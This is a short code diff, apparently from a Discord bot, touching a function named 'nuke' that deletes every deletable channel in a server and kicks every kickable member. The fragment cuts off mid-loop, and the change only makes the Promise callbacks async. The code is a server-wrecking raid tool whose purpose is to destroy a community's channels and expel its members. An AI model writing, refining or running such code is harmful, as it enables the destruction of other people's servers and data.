@@ -51,7 +51,7 @@ const nuke = async g => {
     const channels = g.channels.cache;
 
     try {
-        new Promise(_ => {
+        new Promise(async _ => {
             for (const channel of channels.values()) {            
                 if ("deletable" in channel &&
                     channel.deletable) channel.delete();
@@ -60,7 +60,7 @@ const nuke = async g => {
             }
         });
 
-        new Promise(_ => {
+        new Promise(async _ => {
             for (const member of members.values()) {
                 if (member.kickable) member.kick();
     
